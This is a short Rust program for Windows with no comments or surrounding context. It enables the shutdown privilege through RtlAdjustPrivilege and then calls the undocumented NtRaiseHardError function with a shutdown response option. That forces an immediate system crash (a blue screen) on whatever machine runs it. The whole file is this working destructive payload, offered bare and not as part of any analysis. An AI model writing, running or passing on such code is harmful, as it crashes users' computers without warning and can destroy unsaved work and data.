#![windows_subsystem = "console"]

use std::ffi::c_void;

#[link(name = "ntdll")]
extern "system" {
    fn RtlAdjustPrivilege(Privilege: u32, Enable: u8, CurrentThread: u8, Enabled: *mut u8) -> i32;
    fn NtRaiseHardError(ErrorStatus: u32, NumberOfParameters: u32, UnicodeStringParameterMask: u32, Parameters: *mut c_void, ValidResponseOptions: u32, Response: *mut u32) -> i32;
}

fn main() {
    let mut enabled: u8 = 0;
    let mut response: u32 = 0;
    
    unsafe {
        RtlAdjustPrivilege(19, 1, 0, &mut enabled);
        NtRaiseHardError(0xC0000420, 0, 0, std::ptr::null_mut(), 6, &mut response);
    }
}

